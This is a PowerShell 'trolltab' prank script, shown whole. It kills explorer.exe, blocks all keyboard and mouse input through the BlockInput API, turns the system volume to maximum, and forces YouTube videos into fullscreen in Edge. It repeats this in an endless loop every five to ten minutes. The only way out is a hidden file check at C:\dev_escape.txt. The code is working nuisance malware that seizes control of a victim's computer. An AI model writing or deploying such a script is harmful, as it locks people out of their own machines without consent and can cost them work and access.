# Standalone Trolltab Script with True Fullscreen, Developer Escape, and Forced Input Blocking
# ------------------------------------------------------------------------------------------
# This script:
# 1. Plays a designated special video once (it will not be repeated).
# 2. Enters an infinite loop to randomly select and play one of several YouTube videos.
#
# For each video:
# - Retrieves the video's duration by parsing the YouTube page HTML.
# - Maximizes system volume.
# - Disables both keyboard and mouse input by:
#   - Killing `explorer.exe` (removes taskbar & start menu).
#   - Using `BlockInput($true)` to block physical input.
# - Opens Microsoft Edge in normal mode.
# - Forces YouTube fullscreen via `F11` and `f` key presses.
# - Waits for the video's exact duration.
# - Re-enables input and restores `explorer.exe`.
#
# Developer Escape: If the file `"C:\dev_escape.txt"` exists, the script re-enables input and exits.

# --- Load .NET type to disable keyboard and mouse input (Only if not already added) ---
if (-not ("KeyboardDisabler" -as [type])) {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class KeyboardDisabler {
        [DllImport("user32.dll")]
        public static extern int BlockInput(bool fBlockIt);
    }
"@
}

# --- Developer Escape Function ---
$escapeTimer = New-Object System.Timers.Timer
$escapeTimer.Interval = 1000
$escapeTimer.AutoReset = $true
$escapeTimer.Enabled = $true
$escapeTimer.Add_Elapsed({
    if (Test-Path "C:\dev_escape.txt") {
        # Re-enable input and restore explorer.exe
        [KeyboardDisabler]::BlockInput($false)
        Start-Process "explorer.exe"
        Write-Host "Developer escape triggered. Exiting script..."
        Stop-Process -Id $PID
    }
})

# --- Function to Retrieve Video Duration from YouTube Page ---
function Get-VideoDuration {
    param([string]$url)
    try {
        $headers = @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        $response = Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -ErrorAction Stop
        if ($response -and $response.Content) {
            $regex = '"lengthSeconds":"(\d+)"'
            $match = [regex]::Match($response.Content, $regex)
            if ($match.Success) {
                return [int]$match.Groups[1].Value
            }
        }
        return 180
    }
    catch {
        return 180
    }
}

# --- Function to Play a Video by URL ---
function Play-Video {
    param([string]$url)

    $duration = Get-VideoDuration -url $url
    Write-Host "Playing video: $url"
    Write-Host "Duration: $duration seconds"

    # Maximize system volume
    $WshShell = New-Object -ComObject WScript.Shell
    for ($i = 0; $i -lt 50; $i++) {
        $WshShell.SendKeys([char]175)
        Start-Sleep -Milliseconds 100
    }

    # Kill explorer.exe (hides taskbar & start menu)
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

    # Disable keyboard & mouse input
    [KeyboardDisabler]::BlockInput($true)

    # Open the video in Microsoft Edge (normal mode)
    Start-Process "msedge.exe" $url
    Start-Sleep -Seconds 3

    # Force browser into fullscreen mode
    $WshShell.SendKeys("{F11}")
    Start-Sleep -Seconds 2
    $WshShell.SendKeys("f")

    # Wait for the video's duration
    Start-Sleep -Seconds $duration

    # Re-enable input and restore explorer.exe
    [KeyboardDisabler]::BlockInput($false)
    Start-Process "explorer.exe"
}

# --- Main Script Execution ---
$specialVideoUrl = "https://youtu.be/RWnaWpBCAC0?si=zGmzaWdDULxtt1Z4"
Play-Video -url $specialVideoUrl

$randomVideos = @(
    "https://youtu.be/q7ja7C8IhZM?si=e27mgoLEzj4z1dhe",
    "https://www.youtube.com/watch?v=IBkscgruZsM",
    "https://youtu.be/xvFZjo5PgG0?si=QFo3WAOZwVNZzbLz",
    "https://youtu.be/_-2dIuV34cs?si=zV3AhfQdu0fi0oQ_"
)

while ($true) {
    $selectedVideo = Get-Random -InputObject $randomVideos
    Play-Video -url $selectedVideo

    # Wait for a random interval between 5 and 10 minutes (300-600 seconds)
    $waitTime = Get-Random -Minimum 300 -Maximum 600
    Write-Host "Waiting for $waitTime seconds before playing the next video."
    Start-Sleep -Seconds $waitTime
}